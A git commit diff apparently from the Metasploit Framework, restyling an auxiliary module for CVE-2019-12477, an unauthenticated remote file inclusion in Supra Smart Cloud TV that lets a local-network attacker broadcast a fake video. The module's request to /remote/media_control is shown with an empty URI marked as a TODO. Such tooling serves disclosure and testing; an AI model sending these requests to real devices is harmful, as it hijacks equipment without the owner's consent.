d943b4d3145c97834867d611dcfc1936ae6a05de
William Vu <William_Vu@rapid7.com>
2019-06-07 11:44:17 -0500

    Fix style

--- modules/auxiliary/admin/http/supra_smart_cloud_tv_rfi.rb
+++ modules/auxiliary/admin/http/supra_smart_cloud_tv_rfi.rb
@@ -4,45 +4,45 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-    include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Remote file inclusion supra smart cloud TV',
-      'Description' => %q{
-        This module exploits an unauthenticated remote file inclusion
-        which exists in supra smart cloud TV. The UPnP protocol for supra smart
-        TV doesn't have any session management and authentication, leveraging
-        this a local attacker could send crafted packet to broadcast fake videos.
+      'Name'           => 'Supra Smart Cloud TV Remote File Inclusion',
+      'Description'    => %q{
+        This module exploits an unauthenticated remote file inclusion which
+        exists in Supra Smart Cloud TV. The media control for the device doesn't
+        have any session management or authentication. Leveraging this, an
+        attacker on the local network can send a crafted request to broadcast a
+        fake video.
       },
-      'References'  =>
-        [
-          ['CVE', '2019-12477'],
-          ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
-        ],
-      'Author'      =>
-        [
-          'Dhiraj Mishra' #Discovery & Metasploit module
-        ],
+      'Author'         => [
+        'Dhiraj Mishra' # Discovery, PoC, and module
+      ],
+      'References'     => [
+        ['CVE', '2019-12477'],
+        ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
+      ],
       'DisclosureDate' => '2019-06-03',
-      'License'     => MSF_LICENSE
+      'License'        => MSF_LICENSE
     ))
-
-    register_options(
-      [
-        Opt::RPORT(80)
-      ])
   end
 
   def run
-     res = send_request_cgi({
-        'method'   => 'GET',
-        'uri'      => "/remote/media_control?action=setUri&uri=#{}"
-     })
-        if res && res.code == 200
-            print_good("Fake video was broadcasted")
-        else
-            print_error("No, fake video was broadcasted")
-        end
-     end
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/remote/media_control',
+      'vars_get' => {
+        'action' => 'setUri',
+        'uri'    => '' # TODO: Make this work
+      }
+    )
+
+    unless res && res.code == 200
+      print_error('No fake video was broadcasted')
+      return
+    end
+
+    print_good('Fake video was broadcasted')
   end
+end
